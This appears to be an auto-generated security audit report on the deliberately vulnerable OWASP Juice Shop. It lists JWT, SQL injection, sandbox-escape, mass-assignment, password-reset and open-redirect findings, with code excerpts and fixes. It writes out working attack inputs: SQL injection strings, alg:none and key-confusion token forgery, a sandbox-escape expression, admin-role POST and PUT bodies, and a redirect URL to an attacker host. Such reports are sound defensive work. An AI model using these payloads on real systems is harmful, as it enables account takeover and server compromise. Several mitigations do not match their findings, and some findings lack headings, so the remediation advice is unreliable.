<a id="th-01"></a><a id="th-02"></a><a id="th-03"></a><a id="th-05"></a><a id="th-06"></a><a id="th-04"></a><a id="th-07"></a><a id="th-08"></a><a id="th-09"></a><a id="th-11"></a><a id="th-12"></a><a id="th-14"></a><a id="th-16"></a><a id="th-17"></a><a id="th-18"></a>

### 🔴 Critical (12)

<a id="t-004"></a><a id="f-004"></a>
#### F-004 · RSA Private Key Hardcoded as String Literal (lib/insecurity.ts:21)

**Severity:** 🔴 Critical  ·  **Component:** [C-03](#c-03) - Authentication and Authorization Service  ·  **Location:** `lib/insecurity.ts:21`

**Weakness:** [W-003](#w-003) - Secrets are committed to source instead of a managed store

**Issue:** The 1024-bit RSA private key used to sign all JWTs is embedded verbatim as a multi-line string constant. Any developer, contractor, or attacker with read access to the source repository (GitHub, CI artefacts, compiled bundles) possesses the signing key.

With it, they can mint arbitrary JWTs that pass `jwt.verify` at line 189 and every `isAuthorized()` middleware check - bypassing authentication for all protected endpoints. The key is also used by `deluxeToken()` at line 150, so HMAC-based deluxe-user tokens are equally forgeable.

Any party who has ever cloned the repository can forge admin or deluxe-user JWTs indefinitely; there is no way to rotate the key without changing the source code.

**Evidence:** Line 21 assigns `const privateKey = '----**** (31 chars)\r\nMIICXAI...'` - a full PEM key embedded directly in a committed TypeScript file.

**Fix:** Move the cryptographic key out of source control into a managed secret store and rotate it → ● [M-004](#m-004) — Load RSA private key from an environment variable or secret manager at startup (`insecurity.ts:21`)

**Classification:** Cryptographic Failures · [CWE-321](https://cwe.mitre.org/data/definitions/321.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · walkthrough [Walkthrough §3.8](#38-rsa-private-key-hardcoded-as-string-literal)

<a id="t-005"></a><a id="f-005"></a>
#### F-005 · JWT Algorithm Restriction Missing express-jwt Accepts algorithm none

**Severity:** 🔴 Critical  ·  **Component:** [C-03](#c-03) - Authentication and Authorization Service  ·  **Location:** `lib/insecurity.ts:52`

**Weakness:** [W-007](#w-007) - Security-sensitive data uses weak cryptographic primitives

**Issue:** express-jwt 0.1.3 is configured as `expressJwt({ secret: publicKey })` with no `algorithms` allowlist. The jsonwebtoken 0.4.0 library (`package.json:132`) honours the algorithm field embedded in the JWT header, including the `alg:none` special value that disables signature verification entirely.

An unauthenticated attacker crafts a JWT with header `{"alg":"none"}`, omits the signature, and places any valid-looking user payload (including `{"data":{"role":"admin"}}`) in the body. The middleware accepts it as authentic.

Complete authentication bypass: any attacker can forge an admin-level JWT and access every privileged API endpoint without credentials.

**Evidence:** Line 52 configures `expressJwt({ secret: publicKey })` without an `algorithms: ['RS256']` restriction; jsonwebtoken 0.4.0 has no default algorithm deny-list.

**Fix:** Replace the broken algorithm with a vetted modern primitive (AES-GCM / Argon2id / Ed25519) → ● [M-005](#m-005) — Pin allowed algorithms to RS256 in expressJwt and `jwt.verify` calls (`insecurity.ts:52`)

**Classification:** Cryptographic Failures · [CWE-327](https://cwe.mitre.org/data/definitions/327.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · walkthrough [Walkthrough §3.7](#37-jwt-algorithm-restriction-missing-express-jwt-accepts-algorithm-none)

<a id="t-006"></a><a id="f-006"></a>
#### F-006 · OAuth Implicit Flow with Algorithmically Derived Password

**Severity:** 🔴 Critical  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/oauth/oauth.component.ts:30`

**Weakness:** [W-003](#w-003) - Secrets are committed to source instead of a managed store

**Issue:** The OAuth callback component uses the implicit grant: `parseRedirectUrlParams()` at line 71 extracts `access_token` directly from the URL hash fragment, and line 28 exchanges this token for the user profile. The critical flaw is at line 30: `const password = btoa(profile.email.split('').reverse().join(''))` - the user's Juice Shop password is algorithmically derived from their email address using a publicly known, deterministic formula.

Any party who knows a user's email can compute their password instantly without interacting with Google/GitHub. This creates a parallel authentication path: an attacker calls POST `/rest/user/login` with `{email: victim@gmail.com, password: btoa('moc.liamg@mitciv')}` and authenticates directly without OAuth.

Any OAuth user's Juice Shop account can be compromised by anyone knowing their email address, bypassing the OAuth identity provider entirely.

**Evidence:** `oauth.component.ts:30` derives `password = btoa(email.split('').reverse().join(''))` - a fully predictable value computable by any observer who knows the target's email address.

```typescript
// frontend/src/app/oauth/oauth.component.ts:30
  ngOnInit (): void {
    this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
      next: (profile: any) => {
        const password = btoa(profile.email.split('').reverse().join(''))
        this.userService.save({ email: profile.email, password, passwordRepeat: password }).subscribe({
          next: () => {
            this.login(profile)
```

**Fix:** Move the credential out of source control into a secret store and rotate it → ● [M-006](#m-006) — Migrate OAuth flow to authorization code + PKCE and decouple OAuth identity from password-based auth (`oauth.component.ts:30`)

**Classification:** Cryptographic Failures · [CWE-798](https://cwe.mitre.org/data/definitions/798.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-007"></a><a id="f-007"></a>
#### F-007 · Insecure JWT Verification

**Severity:** 🔴 Critical  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** Multiple locations (6)

**Instances (6):** 🔴 `lib/insecurity.ts:52`, 🔴 `routes/chat.ts:45`, 🟠 `lib/insecurity.ts:53`, 🟠 `lib/insecurity.ts:56`, 🔴 `lib/insecurity.ts:189`, 🔴 `routes/verify.ts:120`

**Issue:** The `isAuthorized()` middleware is configured as `expressJwt({ secret: publicKey })` without specifying an `algorithms` allowlist. The public key is exposed at `/encryptionkeys/jwt.pub` (unauthenticated directory listing).

An attacker downloads the public key, crafts a JWT with header `{ alg: 'HS256' }`, signs it with the public key bytes used as the HMAC-SHA256 secret, and submits it. The server - expecting `RS256` but accepting any algorithm - validates the HMAC signature using the same public key it already trusts, accepting the forged token.

Unauthenticated attacker forges a valid admin JWT using the publicly available RSA public key, bypassing all `isAuthorized()` guards.

**Evidence:** `lib/insecurity.ts:52`: `expressJwt({ secret: publicKey })` with no `algorithms` field; public key at `encryptionkeys/jwt.pub` served via unauthenticated directory listing at `/encryptionkeys`.

```typescript
// lib/insecurity.ts:52
  return str
}

export const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)
export const denyAll = () => expressJwt({ secret: '' + Math.random() } as any)
export const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })
export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false
```

**Fix:** Pin the signature algorithm explicitly and reject `alg:none` and unknown algorithms → ● [M-007](#m-007) — Pin JWT algorithm allowlist to RS256 in express-jwt configuration (`insecurity.ts:52`)

**Classification:** Broken Authentication · [CWE-347](https://cwe.mitre.org/data/definitions/347.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/) · walkthrough [Walkthrough §3.1](#31-insecure-jwt-verification-in-express-rest-api-backend)

<a id="t-008"></a><a id="f-008"></a>
#### F-008 · Unsalted MD5 Password Hashing (models/user.ts:76)

**Severity:** 🔴 Critical  ·  **Component:** [C-05](#c-05) - Data Persistence Layer  ·  **Location:** `models/user.ts:76`

**Weakness:** [W-007](#w-007) - Security-sensitive data uses weak cryptographic primitives

**Issue:** The User model's password setter calls `security.hash(clearTextPassword)`, which resolves to `crypto.createHash('md5').update(data).digest('hex')` (`lib/insecurity.ts:41`). `MD5` is a broken hash function: it produces a 128-bit digest with no per-user salt, completing in nanoseconds on modern GPUs.

An attacker who obtains the Users table - via the SQL injection at `routes/search.ts:23`, a backup leak, or direct SQLite file access - can crack all password hashes offline using precomputed rainbow tables or GPU-accelerated brute force. Because hashes are unsalted, identical passwords map to identical hashes, revealing password reuse across the entire user base.

Full offline credential recovery for all user accounts; administrative account takeover via rainbow-table lookup against the known seed password hashes.

**Evidence:** `security.hash()` at `lib/insecurity.ts:41` wraps Node's `crypto.createHash('md5')` - invoked unconditionally by the User model password setter at `models/user.ts:76` with no salt argument.

**Fix:** Replace the broken hash with a salted password-hashing function (bcrypt/Argon2id) → ● [M-008](#m-008) — Replace MD5 with bcrypt (cost factor ≥12) in User model password setter (`user.ts:76`)

**Classification:** Cryptographic Failures · [CWE-916](https://cwe.mitre.org/data/definitions/916.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · walkthrough [Walkthrough §3.2](#32-unsalted-md5-password-hashing-in-user)

<a id="t-009"></a><a id="f-009"></a>
#### F-009 · Derived Credential from OAuth Email Claim (oauth.component.ts:30)

**Severity:** 🔴 Critical  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/oauth/oauth.component.ts:30`

**Issue:** The OAuth callback handler at `oauth.component.ts:30` derives the user's Juice Shop password using the deterministic formula `btoa(profile.email.split('').reverse().join(''))`. Because this derivation depends solely on the publicly known or guessable email address, any attacker who knows a victim's email can compute the correct password without OAuth involvement and authenticate directly against the `/rest/user/login` endpoint.

This creates a parallel authentication path that completely bypasses the OAuth identity provider. For example, if the victim's email is `victim@example.com`, the attacker computes `btoa('moc.elpmaxe@mitciv')` and submits it as the password.

An attacker knowing any social-login user's email address can authenticate as that user without OAuth, gaining full account access including order history, payment methods, and admin privileges if the victim has an elevated role.

**Evidence:** `OAuthComponent.ngOnInit()` at line 30 calls `btoa(profile.email.split('').reverse().join(''))` to construct both the registration password and the login credential, making every social-login account's password a pure deterministic function of the email address.

```typescript
// frontend/src/app/oauth/oauth.component.ts:30
  ngOnInit (): void {
    this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
      next: (profile: any) => {
        const password = btoa(profile.email.split('').reverse().join(''))
        this.userService.save({ email: profile.email, password, passwordRepeat: password }).subscribe({
          next: () => {
            this.login(profile)
```

**Fix:** ● [M-009](#m-009) — Replace deterministic email-derived password with a cryptographically random credential for OAuth-linked accounts (`oauth.component.ts:30`)

**Classification:** Broken Authentication · [CWE-522](https://cwe.mitre.org/data/definitions/522.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)

<a id="t-010"></a><a id="f-010"></a>
#### F-010 · SQL Injection via String Concatenation in Login Query (routes/login.ts:34)

**Severity:** 🔴 Critical  ·  **Component:** [C-03](#c-03) - Authentication and Authorization Service  ·  **Location:** `routes/login.ts:34`

**Weakness:** [W-001](#w-001) - Database access relies on concatenated queries

**Issue:** The login handler builds its SQL query by direct string interpolation: `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}'`. An attacker submits `email = \' OR 1=1 --` to collapse the WHERE clause, logging in as the first user in the table (typically the administrator).

More destructively, UNION-based injection (`' UNION SELECT * FROM Users --`) exfiltrates the full user table including password hashes. Blind boolean and time-based techniques allow enumeration even when output is not reflected.

Authentication bypass for any account, plus full read/write access to the Users table including password hashes, emails, and security answers.

**Evidence:** Line 34 passes `req.body.email` and `req.body.password` via template-literal interpolation into a raw Sequelize `query()` call with no parameterisation.

```typescript
// routes/login.ts:34

  return (req: Request, res: Response, next: NextFunction) => {
    verifyPreLoginChallenges(req) // vuln-code-snippet hide-line
    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge
      .then((authenticatedUser) => { // vuln-code-snippet neutral-line loginAdminChallenge loginBenderChallenge loginJimChallenge
        const user = utils.queryResultToJson(authenticatedUser)
        if (user.data?.id && user.data.totpSecret !== '') {
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-010](#m-010) — Replace raw SQL string concatenation with Sequelize parameterised query or ORM finder (`login.ts:34`)

**Classification:** Injection · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.3](#33-sql-injection-in-authentication-and-authorization-service)

**Issue:** The product search handler interpolates `req.query.q` directly into a LIKE clause: `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL)`. Submitting `q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--` dumps the entire database schema.

```typescript
    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge
      .then(([products]: any) => {
        const dataString = JSON.stringify(products)
        if (challengeUtils.notSolved(challenges.unionSqlInjectionChallenge)) { // vuln-code-snippet hide-start
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-011](#m-011) — Parameterize the product search LIKE query (`search.ts:23`)

**Classification:** Injection · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.4](#34-sql-injection-in-express-rest-api-backend)

#### F-012 · Remote code execution via notevil sandbox escape in B2B order endpoint

**Severity:** 🔴 Critical  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/b2bOrder.ts:21`

**Issue:** The B2B order endpoint evaluates the caller-supplied `orderLinesData` field using `notevil` (a 'safe' JS evaluator) inside a Node\.js `vm.createContext` sandbox: `vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })`. The `notevil` library has known sandbox escape vectors - for example, accessing `this.constructor.constructor('return process')()` to obtain the Node\.js `process` object.

An authenticated B2B caller (any user with a valid JWT) can achieve arbitrary code execution on the server. Full server-side code execution: file system read/write, process spawning, lateral movement to internal network, data exfiltration.

**Evidence:** `routes/b2bOrder.ts:21-23`: `const sandbox = { safeEval, orderLinesData }; vm.createContext(sandbox); vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })` - user-controlled `orderLinesData` evaluated as JavaScript.

```typescript

      const orderLinesData = body.orderLinesData || ''
      try {
        const sandbox = { safeEval, orderLinesData }
        vm.createContext(sandbox)
        vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
        res.json({ cid: body.cid, orderNo: uniqueOrderNumber(), paymentDue: dateTwoWeeksFromNow() })
```

**Fix:** Replace runtime code generation (eval/Function/template render) with a data-only execution path → ● [M-012](#m-012) — Remove server-side expression evaluation from the B2B order endpoint; accept only structured JSON order data (`b2bOrder.ts:21`)

**Classification:** Code Execution via Unsafe Deserialization or Eval · [CWE-94](https://cwe.mitre.org/data/definitions/94.html) · [OWASP A08:2025](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/)

**Issue:** Juice Shop registers all Sequelize models as finale-rest resources at `server.ts:481`-507. For the User model (line 484), only `password` and `totpSecret` are in the `excludeAttributes` list - the `role` field is fully writable via API.

A PUT or PATCH to `/api/Users/:id` with body `{"role": "admin"}` will persist the admin role directly to the Users table without any privilege check. The `isIn` validator at `models/user.ts:83` permits `admin` as a valid value, so validation passes.

Any authenticated user can grant themselves or another account the admin role, gaining access to all administrative endpoints and challenge-bypass functionality.

**Evidence:** `finale.resource()` at `server.ts:501` registers `/api/Users/:id` with `excludeAttributes: ['password', 'totpSecret']` but leaves the `role` field unrestricted; the User model's `isIn` validator at `models/user.ts:83` allows 'admin' as a permitted value.

```typescript

  ]

  for (const { name, exclude, model, include } of autoModels) {
    const resource = finale.resource({
      model,
      endpoints: [`/api/${name}s`, `/api/${name}s/:id`],
      excludeAttributes: exclude,
```

**Fix:** ● [M-014](#m-014) — Add role field to excludeAttributes and enforce role-change authorization in a dedicated admin endpoint (`server.ts:501`)

#### F-015 · Mass assignment allows self-registration as admin via role field

**Severity:** 🔴 Critical  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** Multiple locations (2)

**Instances (2):** `server.ts:484`, `routes/verify.ts:53`

**Issue:** The `finale.resource` auto-generated endpoint for the User model at `server.ts:483-498` excludes only `password` and `totpSecret` from the create operation. The `role` field (values: `customer`, `deluxe`, `accounting`, `admin`) is not in the `exclude` list.

Any unauthenticated attacker can `POST /api/Users { "email": "evil@evil.com", "password": "pass", "role": "admin" }` and receive a new account with `role: 'admin'`. On next login, the JWT payload will contain `role: 'admin'`, granting access to all admin endpoints and the `isAccounting()` guard.

Any internet user can create an admin account instantly, bypassing all access controls on admin endpoints, product management, user management, and order manipulation.

**Evidence:** `server.ts:483-484`: `{ name: 'User', exclude: ['password', 'totpSecret'], model: UserModel }` - `role` field absent from `exclude` list; `POST /api/Users` is not protected by `isAuthorized()` (`server.ts:363-366` only guards GET/PUT/DELETE).

```typescript
// server.ts:484
  finale.initialize({ app, sequelize: seq })

  const autoModels = [
    { name: 'User', exclude: ['password', 'totpSecret'], model: UserModel },
    { name: 'Product', exclude: [], model: ProductModel },
    { name: 'Feedback', exclude: [], model: FeedbackModel },
    { name: 'BasketItem', exclude: [], model: BasketItemModel },
```

**Fix:** ● [M-015](#m-015) — Add role to the finale User resource excludeAttributes list and enforce default role server-side (`server.ts:484`)

**Classification:** Broken Access Control · [CWE-915](https://cwe.mitre.org/data/definitions/915.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) · walkthrough [Walkthrough §3.6](#36-mass-assignment-allows-self-registration-as-admin-in-express-rest-api-backend)

<a id="t-001"></a><a id="f-001"></a>
#### F-001 · JWT Session Token Written to localStorage (oauth.component.ts:51)

**Severity:** 🟠 High  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** Multiple locations (2)

**Instances (2):** `frontend/src/app/oauth/oauth.component.ts:51`, `frontend/src/app/Services/request.interceptor.ts:13`

**Issue:** The OAuth login callback calls `localStorage.setItem('token', authentication.token)` to persist the session JWT. localStorage is accessible to any JavaScript running on the same origin - including injected scripts via any XSS vulnerability in the application (and OWASP Juice Shop is intentionally riddled with XSS).

An attacker who exploits any stored or reflected XSS reads the token with `localStorage.getItem('token')`, exfiltrates it to an attacker-controlled server, and replays it to impersonate the victim without requiring their credentials. XSS to full session hijack: token stolen from localStorage grants 6 hours of impersonation with no server-side way to invalidate.

**Evidence:** Line 51 in `oauth.component.ts` writes the JWT to `localStorage`, making it readable by any same-origin script.

**Fix:** ● [M-001](#m-001) — Establish dependency update cadence with security patch SLA (`oauth.component.ts:51`)

**Classification:** Insecure Client-Side Storage · [CWE-922](https://cwe.mitre.org/data/definitions/922.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-002"></a><a id="f-002"></a>
#### F-002 · Missing Authentication Middleware on Sensitive API Routes

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** Multiple locations (19)

**Weakness:** [W-002](#w-002) - Authorization is implemented route by route

**Instances (19):** `server.ts:370`, `server.ts:638`, `server.ts:310`, `server.ts:311`, `server.ts:408`, `server.ts:420`, `server.ts:421`, `server.ts:422` … (+11 more)

**Issue:** The `isAuthorized()` middleware for `PUT /api/Products/:id` is commented out at `server.ts:370`: `// app.put('/api/Products/:id', security.isAuthorized())`. The finale-rest resource still serves the endpoint.

Any unauthenticated attacker can send `PUT /api/Products/1 { "description": "<script>...</script>" }` to modify product descriptions. Any internet user can modify product catalog data; combined with HTML rendering in the frontend, this enables stored XSS attacks that hijack admin sessions.

**Evidence:** `server.ts:370`: `// app.put('/api/Products/:id', security.isAuthorized())` - `isAuthorized()` intentionally disabled (vuln-code-snippet comment for `changeProductChallenge`); finale still handles the route without auth.

```typescript
// server.ts:370
  /* Products: Only GET is allowed in order to view products */ // vuln-code-snippet neutral-line changeProductChallenge
  app.post('/api/Products', security.isAuthorized()) // vuln-code-snippet neutral-line changeProductChallenge
  // app.put('/api/Products/:id', security.isAuthorized()) // vuln-code-snippet vuln-line changeProductChallenge
  app.delete('/api/Products/:id', security.denyAll())
  /* Challenges: GET list of challenges allowed. Everything else forbidden entirely */
```

**Fix:** ◕ [M-002](#m-002) — Enforce security response headers policy (CSP, HSTS, X-Frame-Options) (`server.ts:370`)

**Classification:** Broken Access Control · [CWE-862](https://cwe.mitre.org/data/definitions/862.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

<a id="t-003"></a><a id="f-003"></a>
#### F-003 · Client-Side-Only Admin and Accounting Role Guard

**Severity:** 🟠 High  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/app.guard.ts:52`

**Issue:** The `AdminGuard` at `app.guard.ts:52-59` and `AccountingGuard` at `app.guard.ts:64-76` both call `loginGuard.tokenDecode()`, which reads the JWT from localStorage and decodes it client-side without cryptographic signature verification. The guard then checks `payload.data.role === roles.admin`.

An attacker can execute `localStorage.setItem('token', '<crafted-jwt>')` in the browser console to place a JWT bearing `"role":"admin"` - using `alg:none`, a self-signed key, or a token from the Juice Shop's own intentionally weak JWT signing (if the secret is known). Any browser user can navigate to the admin panel UI and access administrative functions; the extent of damage depends on whether the backend API endpoints independently validate the JWT signature (Juice Shop's backend does, but the UI access itself constitutes privilege escalation).

**Evidence:** `app.guard.ts:53-55` calls `loginGuard.tokenDecode()` which uses `jwtDecode()` - a decode-only library that does NOT verify the JWT signature - and checks the decoded `role` field, providing no cryptographic assurance that the token is authentic.

**Fix:** ◕ [M-003](#m-003) — Replace client-side JWT role decode in route guards with server-side authorization check (`app.guard.ts:52`)

**Classification:** Broken Access Control · [CWE-602](https://cwe.mitre.org/data/definitions/602.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

<a id="t-016"></a><a id="f-016"></a>
#### F-016 · Security-Question Password Reset Without Rate Limiting (resetPassword.ts:17)

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/resetPassword.ts:17`

**Issue:** The password-reset handler accepts an email, a security question answer, and a new password via a single POST request with no rate limiting, CAPTCHA, or lockout policy. Security question answers are predictable for public figures and can be scraped from social media (e.g., the challenge at line 58 reveals that 'Samuel' is Jim's answer).

An attacker who identifies a target's email address can programmatically enumerate all plausible security-question answers - first names, pet names, hometown strings - until the HMAC comparison at line 41 (`security.hmac(answer) === data.answer`) succeeds and a new attacker-controlled password is set. Complete account takeover for any user whose security-question answer can be guessed or brute-forced, requiring only the victim's email address.

**Evidence:** `routes/resetPassword.ts:17` begins the handler with no rate-limit or lockout middleware; the HMAC comparison at line 41 is the only gate.

```typescript
// routes/resetPassword.ts:17

export function resetPassword () {
  return async ({ body, connection }: Request, res: Response, next: NextFunction) => {
    const email = body.email
    const answer = body.answer
```

**Fix:** ◕ [M-016](#m-016) — Replace security-question reset with email token flow and add rate limiting (`resetPassword.ts:17`)

**Classification:** Broken Authentication · [CWE-640](https://cwe.mitre.org/data/definitions/640.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)

<a id="t-017"></a><a id="f-017"></a>
#### F-017 · Express-jwt 0.1.3 Critically Outdated JWT Middleware (lib/insecurity.ts:10)

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - Authentication and Authorization Service  ·  **Location:** `lib/insecurity.ts:10`

**Issue:** express-jwt 0.1.3 (`package.json:112`, imported at `lib/insecurity.ts:10`) was released circa 2013 and is 8 major versions behind the current 8.x release. The old version lacks the mandatory `algorithms` field that its successor requires, making the algorithm-confusion and `alg:none` vulnerabilities described in 🔴 [F-005](#f-005) — JWT Algorithm Restriction Missing express-jwt Accepts algorithm none structurally impossible to fix without upgrading.

The outdated library may also carry unpatched CVEs in its dependency chain (jsonwebtoken 0.4.0 at `package.json:132` is similarly ancient and has known CVEs including one for `alg:none`). Structural inability to enforce JWT algorithm restrictions without a library upgrade; potential additional unpatched CVEs in old jsonwebtoken dependency chain.

**Evidence:** `package.json:112` pins `express-jwt` at `0.1.3`; `lib/insecurity.ts:10` imports it - a 13-year-old release with no algorithm restriction API.

```typescript
// lib/insecurity.ts:10
import { type Request, type Response, type NextFunction } from 'express'
import { type UserModel } from '@juice-shop/models/user'
import expressJwt from 'express-jwt'
import jwt from 'jsonwebtoken'
import jws from 'jws'
```

**Fix:** Replace the unmaintained dependency with a maintained equivalent or fork it under ownership → ◕ [M-017](#m-017) — Upgrade express-jwt to 8.x and jsonwebtoken to 9.x and update all call sites to use the new algorithm-pinning API (`insecurity.ts:10`)

**Classification:** Supply-Chain Integrity · [CWE-1104](https://cwe.mitre.org/data/definitions/1104.html) · [OWASP A03:2025](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)

<a id="t-018"></a><a id="f-018"></a>
#### F-018 · Password reset relies solely on security question with OSINT-guessable answers

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/resetPassword.ts:35`

**Issue:** The password reset flow at `routes/resetPassword.ts:35-41` authenticates the caller by matching a security answer HMAC: `SecurityAnswerModel.findOne({ include: [{ model: UserModel, where: { email } }] })` then `security.hmac(answer) === data.answer`. Security questions (mother's maiden name, childhood pet, etc.) are OSINT-guessable, especially for known users.

The endpoint has a rate limit of 100 requests/5 minutes (`server.ts:343`) - sufficient for targeted OSINT attacks where the likely answer space is small. Account takeover for any user whose security answer can be guessed via OSINT (social media, public records, challenge hints visible in the UI); no notification sent to account owner.

**Evidence:** `routes/resetPassword.ts:35-41`: security answer is the sole factor; `server.ts:343`: rate limit of 100/5m is loose enough to enumerate short answer spaces.

```typescript
// routes/resetPassword.ts:35
    }
    try {
      const data = await SecurityAnswerModel.findOne({
        include: [{
          model: UserModel,
```

**Fix:** ◕ [M-018](#m-018) — Replace security-question reset with email-based OTP or signed time-limited reset token (`resetPassword.ts:35`)

**Classification:** Broken Authentication · [CWE-640](https://cwe.mitre.org/data/definitions/640.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)

<a id="t-019"></a><a id="f-019"></a>
#### F-019 · OAuth Implicit Flow Without State Parameter (login.component.ts:148)

**Severity:** 🟠 High  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/login/login.component.ts:148`

**Issue:** The `googleLogin()` method at `login.component.ts:148` initiates OAuth2 using `response_type=token`, the implicit flow. The access token is delivered directly in the URL fragment (`#access_token=...`).

No `state` parameter is included in the authorization request, meaning there is no CSRF binding between the login initiation and the redirect callback. An attacker can perform a CSRF-style OAuth login injection, associating the victim's browser session with the attacker's Google account, or intercept the access token from the URL fragment via browser history, referrer leakage, or embedded third-party scripts.

**Evidence:** At `login.component.ts:148`, `location.replace()` constructs the Google authorization URL with `response_type=token` and no `&state=` parameter, delivering the access token in the URL fragment with no CSRF protection.

```typescript
// frontend/src/app/login/login.component.ts:148

  googleLogin () {
    this.windowRefService.nativeWindow.location.replace(`${oauthProviderUrl}?client_id=${this.clientId}&response_type=token&scope=email&redirect_uri=${this.redirectUri}`)
  }
}
```

**Fix:** Strengthen authentication: enforce a vetted JWT verifier with explicit algorithm, MFA where appropriate → ◕ [M-019](#m-019) — Migrate OAuth flow to authorization code with PKCE and mandatory state parameter (`login.component.ts:148`)

**Classification:** Broken Authentication · [CWE-287](https://cwe.mitre.org/data/definitions/287.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)

<a id="t-020"></a><a id="f-020"></a>
#### F-020 · Unauthenticated WebSocket Channel

**Severity:** 🟠 High  ·  **Component:** [C-07](#c-07) - Real-time WebSocket Channel  ·  **Location:** Multiple locations (3)

**Weakness:** [W-004](#w-004) - Endpoints are reachable without enforced authentication

**Instances (3):** `lib/startup/registerWebsocketEvents.ts:20`, `lib/startup/registerWebsocketEvents.ts:33`, `lib/startup/registerWebsocketEvents.ts:40`

**Issue:** The socket\.io server is created with CORS restricted to `http://localhost:4200` (a development-only origin), but no `io.use()` authentication middleware is installed. Any client - whether a browser at the expected origin or a raw WebSocket tool such as `wscat` or a custom script - can establish a persistent socket\.io connection without providing a session token, JWT, or cookie.

Browser-origin CORS enforcement does not apply to non-browser clients, and even browser requests from a compromised page can bypass the `localhost:4200` restriction once the initial HTTP upgrade completes without a server-side token check. Any anonymous network client gains the ability to receive server-pushed notifications and invoke all challenge-verification and state-mutation event handlers without authentication.

**Evidence:** Line 20 creates the socket\.io `Server` with only a CORS origin config; line 23 `io.on('connection', ...)` attaches all event handlers with no prior auth gate and no `io.use()` middleware.

```typescript
// lib/startup/registerWebsocketEvents.ts:20

const registerWebsocketEvents = (server: any) => {
  const io = new Server(server, { cors: { origin: 'http://localhost:4200' } })
  globalWithSocketIO.io = io

```

**Fix:** ◕ [M-020](#m-020) — Add socket\.io authentication middleware to validate session or JWT on every connection (`registerWebsocketEvents.ts:20`)

**Classification:** Unauthenticated Management Plane · [CWE-306](https://cwe.mitre.org/data/definitions/306.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

<a id="t-021"></a><a id="f-021"></a>
#### F-021 · Open Redirect via Substring Allowlist Bypass (routes/redirect.ts:17)

**Severity:** 🟠 High  ·  **Component:** [C-08](#c-08) - Web3 / Wallet / NFT Surface  ·  **Location:** `routes/redirect.ts:17`

**Issue:** The GET `/redirect` endpoint reads the destination from `query.to` and passes it to `security.isRedirectAllowed()`, which returns true when any allowlisted URL appears anywhere as a substring in the attacker-supplied URL (`lib/insecurity.ts:136` - `url.includes(allowedUrl)`). An attacker crafts a URL such as `GET /redirect?to=https://evil.example.com/?ref=https://github.com/juice-shop/juice-shop` - the allowlist check passes because the GitHub URL appears as a query parameter substring, and Express calls `res.redirect()` with the attacker-controlled destination.

